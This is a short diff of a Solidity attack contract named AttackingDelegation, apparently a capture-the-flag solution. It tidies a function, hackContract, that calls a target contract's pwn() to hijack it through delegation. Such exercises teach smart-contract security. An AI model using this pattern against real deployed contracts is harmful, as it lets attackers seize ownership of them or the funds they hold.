@@ -10,8 +10,7 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        bool ok;
-        (ok,) = contractAddress.call(abi.encodeWithSignature("pwn()"));
+        (bool ok,) = contractAddress.call(abi.encodeWithSignature("pwn()"));
         if (!ok) {
             revert();
         }
